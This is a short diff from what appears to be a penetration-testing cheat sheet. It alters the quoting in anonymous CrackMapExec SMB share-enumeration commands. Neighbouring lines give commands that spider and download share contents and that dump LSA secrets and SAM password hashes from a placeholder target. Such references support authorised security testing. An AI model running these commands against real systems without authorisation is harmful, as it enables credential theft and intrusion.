@@ -2194,9 +2194,9 @@ sqsh -S <RHOST> -U <USERNAME>
 #### CrackMapExec
 
 ```c
-crackmapexec smb <RHOST> -u '' -p '' --shares
-crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus
-crackmapexec smb <RHOST> -u '' -p '' --shares -M spider_plus -o READ_ONLY=false
+crackmapexec smb <RHOST> -u " " -p "" --shares
+crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus
+crackmapexec smb <RHOST> -u " " -p "" --shares -M spider_plus -o READ_ONLY=false
 crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --shares
 crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --lsa
 crackmapexec smb <RHOST> -u "<USERNAME>" -p "<PASSWORD>" --sam
